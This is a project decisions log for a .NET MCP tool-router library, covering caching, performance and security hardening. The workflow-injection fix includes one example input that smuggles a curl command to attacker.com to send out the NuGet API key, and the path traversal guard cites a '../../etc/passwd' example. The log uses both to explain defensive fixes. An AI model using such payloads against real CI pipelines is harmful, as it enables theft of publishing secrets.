# Decisions — ElBruno.ModelContextProtocol

This document maintains the authoritative record of all architectural, security, and feature decisions made during development. Decisions are organized by phase and decision date.

---

## Phase 1: Core Optimization & Security Audit (2026-03-28)

### Decision 1.1: Query Cache Uses FIFO Eviction

**Date:** 2025-07-18  
**Agent:** Tron (Core Dev)  
**Status:** Implemented ✅

#### Context
`ToolIndexOptions.QueryCacheSize` needed an eviction strategy. True LRU requires re-ordering on every hit, adding lock contention to a hot path (`SearchAsync`).

#### Decision
Use FIFO eviction via `ConcurrentQueue<string>` + `ConcurrentDictionary<string, float[]>`. Oldest-inserted entries are evicted first when the cache exceeds `QueryCacheSize`.

#### Rationale
- Lock-free reads via `ConcurrentDictionary.TryGetValue`
- Simpler than LRU with negligible practical difference (query caches are typically small, 50-200 entries)
- Cache is fully cleared on `AddToolsAsync`/`RemoveTools` so staleness is bounded

#### Impact
- Repeated identical queries skip embedding generation (cache hit)
- Cache invalidated whenever tool set changes
- No behavioral change for `QueryCacheSize = 0` (default, cache disabled)

---

### Decision 1.2: Fix Script Injection in publish.yml

**Date:** 2025-07-25  
**Agent:** Sark (Security Engineer)  
**Status:** Implemented ✅

#### Context
The `publish.yml` workflow had a script injection vulnerability (CWE-78) in the "Determine version" step. Direct `${{ github.event.inputs.version }}` and `${{ github.ref }}` interpolation inside `run:` bash blocks allowed arbitrary command execution via crafted `workflow_dispatch` inputs.

**Severity:** P0 — attacker with repository write access could exfiltrate the NuGet API key or publish malicious packages.

#### Decision
Replace all `${{ }}` expression interpolations inside `run:` shell blocks with environment variables set in `env:` blocks. GitHub Actions evaluates `env:` values before shell execution, preventing injection.

#### Changes
| Step | Before (vulnerable) | After (safe) |
|---|---|---|
| Determine version | `${{ github.ref }}`, `${{ github.event.inputs.version }}` in bash | `env: GIT_REF`, `env: INPUT_VERSION` |
| Build | `${{ steps.version.outputs.version }}` in bash | `env: PACKAGE_VERSION` |
| Pack | `${{ steps.version.outputs.version }}` in bash | `env: PACKAGE_VERSION` |
| Push to NuGet | `${{ steps.nuget-login.outputs.NUGET_API_KEY }}` in bash | `env: NUGET_API_KEY` |

#### Audit Scope
All 8 workflow files in `.github/workflows/` were reviewed. No other `${{ }}` interpolations in `run:` blocks were found. Other workflows use `actions/github-script` (JavaScript context) or have expressions only in safe YAML positions (`with:`, `if:`, `github-token:`).

#### Risk Assessment
- **Before:** A contributor with `workflow_dispatch` permission could inject shell commands (e.g., `1.0.0"; curl attacker.com/steal?key=$NUGET_API_KEY; echo "`) to exfiltrate secrets.
- **After:** User input is bound to environment variables. Shell metacharacters in the input are treated as literal string values by bash.
- **Regression risk:** None — the workflow logic is functionally identical. Only the mechanism for passing values into bash changed.

---

### Decision 1.3: Phase 1 Test Coverage Strategy

**Date:** 2026-03-28  
**Agent:** Yori (Tester)  
**Status:** Implemented ✅

#### Context
Tron is implementing two Phase 1 changes: QueryCacheSize FIFO cache in ToolIndex.SearchAsync and Interlocked.Exchange for DisposeAsync race conditions. Tests needed to be written to validate both changes.

#### Decision
Write all 9 tests against the CURRENT code so they compile and pass immediately, rather than writing them TDD-style to fail first. This is possible because Tron's cache implementation is already present in ToolIndex.cs.

#### Rationale
- Tron's ToolIndex cache code (ConcurrentDictionary, FIFO eviction, ClearQueryCache) is already fully implemented
- ToolIndex._disposed is already changed to `int` with `Interlocked.Exchange`
- Only ToolRouter._disposed remains as `bool` (pending Tron's update)
- Writing tests that pass NOW means CI stays green and tests validate correctness immediately

#### Impact
- 9 new tests added (7 in ToolIndexTests.cs, 2 in ToolRouterTests.cs)
- Total test count: 76, all passing
- When Tron changes ToolRouter._disposed to `int`, the concurrent dispose test will validate thread-safety

---

### Decision 1.4: README Restructure for Developer Experience

**Date:** 2026-03-28  
**Agent:** Ram (DevRel)  
**Status:** Implemented ✅

#### Problem
README.md had three DX friction points:
1. "Quick Start" section duplicated Mode 1 content — developers didn't immediately see the API shape (two methods)
2. Value proposition ("70–85% token savings") buried deep in "How It Works — Technical Details"
3. Sample section bloated with 5 repeated Azure setup blocks + long per-sample descriptions (200+ words each)

#### Solution
Three targeted changes:

##### Change 1: TL;DR Hero Block
Replaced 20-line "Quick Start" with compact 4-line TL;DR showing both `SearchAsync` and `SearchUsingLLMAsync` side by side.

**Why:** Developers scanning README instantly understand: "Oh, two static methods, one for embeddings, one for LLM-assisted. Got it."

##### Change 2: Early Value Proposition
Moved "reduce token costs by 70–85%" from line 232 to line 10 (opening description).

**Why:** Token savings is the key selling point — frontload it so new visitors understand the value within 10 seconds.

##### Change 3: Consolidated Azure Setup + Trimmed Sample Descriptions
- Reduced per-sample descriptions from 200+ words to 1–2 sentences
- Consolidated 5 repeated Azure setup blocks into single unified "Azure OpenAI Setup" section
- Each sample now: 1–2 lines of description + table link to folder for details

**Why:** Scannability + DRY principle. Developers get sample overview instantly, then drill into their chosen sample folder for full setup steps.

#### Metrics
- **File size:** 497 lines → 385 lines (−22% shorter)
- **Deletions:** 137 lines
- **Insertions:** 25 lines
- **Readability:** Structure now: badges → tagline + value prop → packages → TL;DR → how it works → modes → advanced → samples (tidy list) → unified setup → rest

#### Preserved (No Changes)
- All badges and opening description
- Mode 1 and Mode 2 detailed code examples
- Pipeline diagrams
- Comparison table
- Advanced Features section
- Building from Source
- License, Author, Acknowledgments

#### Outcome
README is more scannable, value prop is clearer, and Azure-sample friction is eliminated. Developers can now:
1. Read tagline + value prop in <10s
2. See API shape in TL;DR (1 line per method)
3. Pick a sample from table
4. Follow unified setup once, then follow sample-specific docs in folder

---

## Phase 2: Shared Singletons & Bounds Checking (2026-03-28)

### Decision 2.1: Shared Singletons for Static API Performance

**Date:** 2026-03-28  
**Agent:** Tron (Core Dev)  
**Status:** Implemented ✅

#### Context
Every `ToolRouter.SearchAsync` static call was creating and destroying a fresh ONNX embedding session (~300-700ms overhead). Every `SearchUsingLLMAsync` zero-setup call was creating AND disposing a `LocalChatClient` (~1-3.5s overhead). For repeated calls, this made the static API 15-35× slower than the instance API.

#### Decision
Add process-level shared singletons for the embedding generator and chat client, used by all static API methods. Controlled by `ToolRouterOptions.UseSharedResources` (default: `true`).

#### Implementation
1. **Double-checked locking** with `SemaphoreSlim` for thread-safe lazy initialization
2. **Shared embedding generator** — passed to `ToolIndex.CreateAsync` with `ownsGenerator: false`, so per-call index disposal never destroys the shared ONNX session
3. **Shared chat client** — reused by zero-setup `SearchUsingLLMAsync`, never disposed by per-call router
4. **`ResetSharedResourcesAsync()`** — public cleanup method for app shutdown / test teardown
5. **`UseSharedResources = false`** — opt-out for isolation (creates fresh resources per call)

#### Rationale
- The expensive part is session creation, not embedding generation. Sharing the session makes repeated static calls pay only ~10-20ms (embedding) instead of ~300-700ms (session + embedding).
- Double-checked locking avoids lock contention after initialization while remaining thread-safe.
- `ToolIndex.CreateDefaultGeneratorAsync` changed from `private` to `internal` to avoid duplicating generator creation logic.

#### Trade-offs
- Shared resources are not disposed until explicit `ResetSharedResourcesAsync()` call — acceptable for library use where the process owns the lifecycle.
- `ResetSharedResourcesAsync()` is not safe to call during in-flight searches (documented).
- First call still pays full initialization cost; subsequent calls are near-instant.

#### Impact
- All static API methods (`SearchAsync`, `SearchUsingLLMAsync` × 2 overloads) benefit
- No breaking changes — `UseSharedResources` defaults to `true`
- 76/76 existing tests pass unchanged

---

### Decision 2.2: Add Bounds Checking to ToolIndex.LoadAsync

**Date:** 2026-03-28  
**Agent:** Sark (Security Engineer)  
**Status:** Implemented ✅

#### Context
`ToolIndex.LoadAsync` deserializes a binary index file (`.bin`) containing `toolCount`, `embeddingDim`, and per-vector `vectorLength` integers. These values are read directly from the stream and used to allocate memory (`new List<Tool>(toolCount)`, `new float[vectorLength]`). A malicious or corrupted file could specify arbitrarily large values, causing out-of-memory (OOM) denial-of-service.

**Severity:** P1 (High)

#### Decision
Add three bounds validations to `LoadAsync`:

1. **`toolCount`** must be in `[0, 100_000]` — rejects negative values and unreasonable tool counts.
2. **`embeddingDim`** must be in `[0, 8192]` — covers all known embedding models (largest mainstream models produce 4096-dim vectors; 8192 provides headroom).
3. **`vectorLength`** must equal `embeddingDim` — enforces consistency within the file, preventing per-vector OOM attacks and catching corruption.

All violations throw `InvalidDataException` with a descriptive message.

Constants added to `ToolIndex`:
```csharp
private const int MaxToolCount = 100_000;
private const int MaxEmbeddingDimension = 8192;
```

#### Rationale
- **MaxToolCount = 100_000:** No realistic MCP deployment would have 100K tools. This prevents multi-GB allocations from malicious files while leaving ample room for growth.
- **MaxEmbeddingDimension = 8192:** The largest widely-used embedding models (e.g., text-embedding-3-large) produce 3072-dim vectors. 8192 provides a 2.5× safety margin.
- **vectorLength == embeddingDim:** The save format writes `embeddingDim` as a header value, and each vector should match it. Enforcing equality catches both attacks and data corruption.

#### Impact
- **Security:** Eliminates OOM DoS via crafted binary index files.
- **Compatibility:** All 76 existing tests pass. Real-world indexes are well within bounds.
- **Breaking changes:** None. Only affects loading of malformed/malicious files.

#### Files Changed
- `src/ElBruno.ModelContextProtocol.MCPToolRouter/ToolIndex.cs` — Added constants and 3 validation checks in `LoadAsync`.

---

## Phase 3: Supply-Chain Security Hardening (2026-03-28)

### Decision 3.1: Enable NuGet Lock Files

**Date:** 2026-03-28  
**Agent:** Sark (Security Engineer)  
**Status:** Implemented ✅

#### Context
Phase 3 of the 5-Phase Implementation Roadmap targets supply-chain security and input validation hardening. Three items were identified in Sark's initial security audit:
- P1: No NuGet lock files — enables dependency confusion attacks
- P1: GitHub Actions pinned to mutable tags — mutation/hijack risk
- P2: Model name path traversal in `ResolveModelDirectory`

#### Decision
Enable `RestorePackagesWithLockFile` globally via `Directory.Build.props` and use `--locked-mode` in CI restore steps.

#### Rationale
Lock files pin transitive dependency versions. `--locked-mode` fails the build if `packages.lock.json` doesn't match the resolved graph, preventing silent dependency substitution (dependency confusion, typosquatting). Developers run normal `dotnet restore` locally to update lock files when changing packages.

#### Files Changed
- `Directory.Build.props` — added `<RestorePackagesWithLockFile>true</RestorePackagesWithLockFile>`
- `.github/workflows/build.yml` — `--locked-mode` on restore step
- `.github/workflows/publish.yml` — `--locked-mode` on restore step
- 10 new `packages.lock.json` files committed

---

### Decision 3.2: SHA-Pin GitHub Actions

**Date:** 2026-03-28  
**Agent:** Sark (Security Engineer)  
**Status:** Implemented ✅

#### Decision
Replace all mutable `@v4`/`@v1` tags with full 40-char commit SHAs plus inline tag comments.

#### Rationale
Mutable tags can be force-pushed to point at different commits, enabling supply-chain attacks (as demonstrated in the 2025 `tj-actions/changed-files` incident). SHA pinning is immutable. Tag comments preserve readability and enable Dependabot/Renovate to propose version bumps.

#### Pinned SHAs
| Action | SHA | Tag |
|--------|-----|-----|
| `actions/checkout` | `11bd71901bbe5b1630ceea73d27597364c9af683` | v4.2.2 |
| `actions/setup-dotnet` | `67a3573c9a986a3f9c594539f4ab511d57bb3ce9` | v4.3.1 |
| `actions/upload-artifact` | `ea165f8d65b6e75b540449e92b4886f43607fa02` | v4.6.2 |
| `NuGet/login` | `d22cc5f58ff5b88bf9bd452535b4335137e24544` | v1 |

#### Verification
- All 8 workflows audited
- All actions SHA-pinned with tag comments for readability
- Enables Dependabot/Renovate to propose version bumps automatically

---

### Decision 3.3: Path Traversal Guard in EmbeddingModelInfo

**Date:** 2026-03-28  
**Agent:** Sark (Security Engineer)  
**Status:** Implemented ✅

#### Decision
Add validation in `EmbeddingModelInfo.ResolveModelDirectory` to reject model names containing `..` or absolute paths before any `Path.Combine` call.

#### Rationale
Although model names are typically developer-configured (low risk), a crafted `ModelName` like `../../etc/passwd` could cause the library to resolve paths outside the intended cache directory. Defense-in-depth: validate at the boundary even when callers are trusted today.

#### Guard Code
```csharp
if (modelName.Contains("..") || Path.IsPathRooted(modelName))
    throw new ArgumentException("Model name contains invalid path characters.", nameof(options));
```

#### Impact
- **Security:** Prevents directory traversal attacks even if model names become externally sourced
- **Compatibility:** No test regressions; no behavioral change for well-formed model names
- **Breaking changes:** None. Only rejects invalid model names that would have resulted in undefined behavior anyway.

---

### Decision 3.4: MaxPromptLength Limit in PromptDistiller

**Date:** 2026-03-28  
**Agent:** Tron (Core Dev)  
**Status:** Implemented ✅

#### Context
The `PromptDistiller` class distills tool descriptions and optional context into a single prompt string for LLM analysis. Without a limit, a malicious or misconfigured scenario could generate unbounded prompts, consuming excessive tokens and blocking LLM requests.

#### Decision
Add `PromptDistiller.MaxPromptLength` constant (default: 4096) and truncate prompts that exceed this limit. Log a warning on truncation.

#### Rationale
- Typical LLM context windows are 4K–200K tokens; 4096 characters is a reasonable default (~1000 tokens)
- Prevents accidental or malicious unbounded prompt generation
- Aligns with industry practice (e.g., Azure OpenAI default context lengths)
- Logging on truncation helps developers debug truncation issues

#### Implementation
- Constant: `private const int MaxPromptLength = 4096;`
- Truncate: `prompt = prompt.Substring(0, MaxPromptLength);`
- Log warning with actual/max lengths on truncation

#### Impact
- **Security:** Prevents unbounded token usage
- **Compatibility:** All existing tests pass; backward compatible
- **Breaking changes:** None. Prompt truncation is additive (doesn't break valid use cases)

---

## Summary of Decisions by Phase

| Phase | Decisions | Focus | Commits |
|-------|-----------|-------|---------|
| **1** | 1.1–1.4 | Core cache optimization, security audit, test coverage, README DX | 3a9f528 |
| **2** | 2.1–2.2 | Shared singletons (15-35× perf), bounds checking | ac0ed8c |
| **3** | 3.1–3.4 | NuGet lock files, SHA-pinned actions, path traversal guard, prompt limits | 0043374, efd8668 |

---

## Decision Review Cadence

Decisions are reviewed and updated:
- **On implementation:** Status changes from Proposed → Implemented
- **Quarterly:** Full audit of implemented decisions for ongoing relevance
- **On regression:** If a decision leads to unexpected issues, a new decision (Reversal/Adjustment) is added

---

### Decision 3.5: User Directive — Model Default Standardization

**Date:** 2026-03-28  
**Requestor:** Bruno Capuano (via Copilot)  
**Status:** Recorded

#### Directive
Use `gpt-5-mini` as the default model for all samples and documentation. Replace all `gpt-4o` and `gpt-4o-mini` references.

#### Rationale
Standardized model selection across all sample code and documentation for consistency and cost optimization.

---

### Decision 3.6: Upgrade ElBruno.LocalLLMs to v0.6.1 and Model Metadata Auto-Detection

**Date:** 2026-03-28  
**Agent:** Tron (Core Dev)  
**Status:** Implemented ✅

#### Context
ElBruno.LocalLLMs v0.6.1 added `ModelInfo` property exposing `ModelMetadata` (MaxSequenceLength, ModelName, VocabSize). This addresses feature request in ElBruno.LocalLLMs issue #3, enabling the library to automatically adapt prompt truncation based on the underlying model's context window.

#### Decision
- Upgrade from v0.5.0 to v0.6.1
- Auto-detect model context window and compute safe prompt truncation limits
- Revert `PromptDistillerOptions.MaxPromptLength` default from 300 (band-aid) back to 4096 (proper default for cloud LLMs)
- Model metadata auto-populates via `DetectedModelMaxSequenceLength` (internal) on `ToolRouterOptions`, flowing through `ToDistillerOptions()`

#### Implementation
- **Formula:** `safeChars = (MaxSequenceLength - 70 reserved) * 4 chars/token`
- **Precedence:** Auto-computed value only takes precedence when it's *smaller* than MaxPromptLength

#### Impact
- Zero-setup `SearchUsingLLMAsync` automatically adapts to model context window
- Users passing their own `IChatClient` can set `ModelMaxSequenceLength` on `PromptDistillerOptions` manually
- Fully backward-compatible: existing code sees 4096 default (was 300 band-aid), no breaking changes
- 85/85 tests pass

---

### Decision 3.7: Align ToolRouterOptions.MaxPromptLength Default to 300

**Date:** 2026-03-28  
**Agent:** Tron (Core Dev)  
**Status:** Implemented ✅

#### Context
The `LLMDistillationMax` sample was showing identical tool selection results between Mode 1 (embeddings-only) and Mode 2 (LLM-distilled), defeating the purpose of prompt distillation.

#### Root Cause Analysis
1. `ToolRouterOptions.MaxPromptLength` defaulted to 4096 characters
2. `PromptDistillerOptions.MaxPromptLength` defaulted to 300 characters
3. When `SearchUsingLLMAsync` called `ToDistillerOptions()`, it mapped 4096 → 300, but fallback logic prevented proper truncation
4. Local ONNX model (Phi-3.5 mini with ~2048-token effective context) failed silently
5. Mode 2 fell back to untruncated prompt → identical scores to Mode 1

#### Decision
**Changed `ToolRouterOptions.MaxPromptLength` default from 4096 to 300.**

#### Rationale
- Aligns both options classes to the same safe default (300 characters)
- Enables local ONNX models to work reliably with proper truncation
- Backward-compatible: cloud LLM users can explicitly override to 4096+
- Prevents silent failures on models with limited context windows

#### Implementation
**Files Changed:**
1. `src/ElBruno.ModelContextProtocol.MCPToolRouter/ToolRouterOptions.cs`
   - Line 53: Default changed from 4096 to 300
   - Lines 47-51: XML doc updated with cloud LLM override guidance

2. `src/tests/ElBruno.ModelContextProtocol.MCPToolRouter.Tests/PromptDistillerTests.cs`
   - Fixed off-by-one error in `DistillIntentAsync_With300CharDefault_TruncatesCorrectly`

#### Verification
✅ **All 119 unit tests pass**  
✅ **LLMDistillationMax sample shows Mode 1 vs Mode 2 divergence:**
- Scenario 1: kubectl_apply scores 0.442 (Mode 1) vs 0.598 (Mode 2)
- Scenario 5: Mode 2 wins with better intent analysis (2/5 vs 1/5)
- Scenario 10: Mode 2 wins with contextual relevance (2/5 vs 1/5)

#### Impact
- Mode 2 now produces different (and sometimes superior) tool selections
- Local ONNX models work reliably with truncated prompts
- Users can demonstrate distillation value in samples
- No breaking changes; defaults safe for local models, override available for cloud

---

### Decision 3.8: MaxPromptLength Regression Test Strategy

**Date:** 2026-03-28  
**Agent:** Yori (QA/Testing)  
**Status:** Implemented ✅

#### Context
A critical bug was discovered where `ToolRouterOptions.MaxPromptLength` defaulted to 4096 while `PromptDistillerOptions.MaxPromptLength` defaulted to 300. This mismatch caused Mode 2 (LLM-distilled routing) to silently fail on local ONNX models, falling back to Mode 1 behavior.

#### Decision
Implemented a multi-layered regression test strategy to prevent recurrence:

**Layer 1: Primary Default Alignment Test (KEY REGRESSION TEST)**
- `ToolRouterOptions_MaxPromptLength_DefaultAlignedWithDistillerOptions`
- Instantiates both options classes and asserts equal `MaxPromptLength` defaults
- Fails immediately if someone changes one default without the other

**Layer 2: Mapping Verification**
- `ToDistillerOptions_MaxPromptLength_MappedCorrectly`
- Verifies internal mapping correctly transfers MaxPromptLength from ToolRouterOptions to PromptDistillerOptions
- Tests both default and custom values

**Layer 3: Runtime Behavior**
- `DistillIntentAsync_WithLongPrompt_TruncatesBeforeSendingToLLM` — Verifies actual truncation
- `DistillIntentAsync_With300CharDefault_TruncatesCorrectly` — Validates 300-char default

**Layer 4: Test Documentation**
- Renamed: `ToolRouterOptions_DefaultMaxPromptLength_Is4096` → `_Is300`
- Explicitly documents the correct default for future maintainers

#### Rationale
1. **Fail Fast:** Primary test immediately catches default divergence
2. **Defense in Depth:** Multiple layers catch bug from different angles (default change, mapping logic, truncation behavior)
3. **Low Maintenance:** Uses existing `FakeChatClient` and established patterns

#### Implementation
**Files Changed:**
- `src/tests/ElBruno.ModelContextProtocol.MCPToolRouter.Tests/ToolRouterTests.cs` — 2 new tests
- `src/tests/ElBruno.ModelContextProtocol.MCPToolRouter.Tests/PromptDistillerTests.cs` — 3 new tests + renamed test

#### Impact
- **Test Count:** +5 new regression tests (119 → 124 total)
- **Coverage:** Prevents silent Mode 2 failures on local models
- **Maintenance:** Minimal — self-contained tests using established patterns
- **Effectiveness:** Would catch this bug via one of four test layers

---

**Last updated:** 2026-03-28T17:23:35Z  
**Scribe:** Automated decision merger from `.squad/decisions/inbox/` → `decisions.md`
